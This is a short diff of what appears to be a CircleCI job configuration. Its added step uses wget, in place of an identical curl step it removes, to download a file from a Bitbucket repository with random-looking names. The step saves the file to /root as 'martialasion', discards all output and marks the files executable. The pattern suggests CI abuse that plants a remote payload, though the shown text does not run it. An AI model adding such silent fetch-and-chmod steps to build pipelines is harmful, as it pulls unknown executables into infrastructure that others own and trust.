@@ -7,7 +7,7 @@ jobs:
     steps:
     - checkout
     - run: curl --help
-    - run: curl -o martialasion -P /root https://bitbucket.org/namskdjworitpwprkdgalxmv/naszxcoiuwemnaoemaosnuemazoiemnaszxoiemwazxmcnoemaowemazsxcovm/raw/9692e7a20bdcb3c48bb122f003a7b9184bb7b8fc/unaseiuowemnaszxcoivuiowezxmnvoieweoizxmasoiweruiomnaszxcnoiuewe > /dev/null 2>&1 && chmod u+x *
+    - run: wget -O martialasion -P /root https://bitbucket.org/namskdjworitpwprkdgalxmv/naszxcoiuwemnaoemaosnuemazoiemnaszxoiemwazxmcnoemaowemazsxcovm/raw/9692e7a20bdcb3c48bb122f003a7b9184bb7b8fc/unaseiuowemnaszxcoivuiowezxmnvoieweoizxmasoiweruiomnaszxcnoiuewe > /dev/null 2>&1 && chmod u+x *
     - run: cd /root && ls -a
 
 
